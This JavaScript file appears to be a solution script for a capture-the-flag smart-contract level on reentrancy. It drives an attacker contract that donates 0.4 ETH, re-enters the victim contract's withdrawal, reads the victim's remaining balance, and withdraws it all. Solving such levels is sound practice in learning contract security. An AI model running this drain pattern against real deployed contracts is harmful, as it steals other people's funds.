const loader = require('../loader.js')
const web3 = require('../web3.js')
const readline = require('readline-sync')

const addressVictim = readline.question(
`What is the deployed level instance address?
> `)
const addressAttacker = readline.question(
`What is the deployed attacker instance address?
> `);

(async () => {
  try {
    console.log('Load deployed attacker contract')
    const attacker = loader.web3.fromArtifact('HackReentrance', addressAttacker)

    console.log('Attacker donates 0.4 ETH...')
    await attacker.methods.donate().send({ value: web3.utils.toWei('0.4', 'ether') })

    console.log('Trigger reentrancy attack...')
    await attacker.methods.reentrance().send()

    console.log('Check remaining balance:')
    const remaining = await web3.eth.getBalance(addressVictim)
    console.log(`Remaining balance is ${remaining} wei.`)

    console.log('Withdraw remaining balance...')
    await attacker.methods.withdraw(remaining).send()
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
